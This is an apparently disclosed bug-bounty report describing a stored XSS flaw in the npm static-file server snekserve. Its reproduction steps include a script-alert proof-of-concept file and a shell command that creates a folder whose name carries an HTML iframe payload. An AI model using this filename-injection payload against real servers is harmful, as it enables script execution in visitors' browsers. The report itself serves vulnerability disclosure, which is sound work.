# [snekserve] Stored XSS via filenames HTML formatted

## Report Details
- **Report ID**: 694930
- **URL**: https://hackerone.com/reports/694930
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2019-09-14T17:59:43.837Z
- **Disclosed**: 2020-09-24T19:27:13.000Z

## Reporter
- **Username**: mik317
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
I would like to report a `stored XSS` issue in the `snekserve` module.
It allows to `inject HTML/JS` code inside the `directory listing` :)

# Module
**module name:** `snekserve`
**version:** `1.0.0`
**npm page:** `https://www.npmjs.com/package/snekserve`

## Module Description
> Assuming you would like to serve a static site, single page application or just a static file (no matter if on your device or on the local network), this package is just the right choice for you.

## Module Stats
[N/A] downloads in the last day
[1] downloads in the last week
[~20] downloads in the last month

## Vulnerability Description
The filenames aren't checked correctly, leading to `stored XSS` inside the `directory listing` :)

## Steps To Reproduce:
1. Create a PoC file like this:

```html
<!-- malicious.html -->
<script>alert(document.domain)</script>
```
2. Run the following commands:

```bash
npm i snekserve -g # Installs the CLI version of the module
mkdir '<iframe src=..\malicious.html>' # Creates the malicious *HTML formatted* folder
snekserve # Starts the server
# Open a browser and go on http://localhost:8080
```
3. Opening the server initialized (on `localhost:8080`), you'll see the `alert(document.domain)` code executed :) {F582927}

## Patch
> Validate the filenames before put them in the `directory listing`

## Supporting Material/References:
- [OPERATING SYSTEM VERSION]: Kali Linux
- [NODEJS VERSION]: 10.16.3
- [NPM VERSION]: 6.0.9

# Wrap up
- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N]

## Impact

`Stored XSS` on `snekserve` via `filename HTML injection`

## Attachments
- Screenshot_from_2019-09-14_17-56-48.png
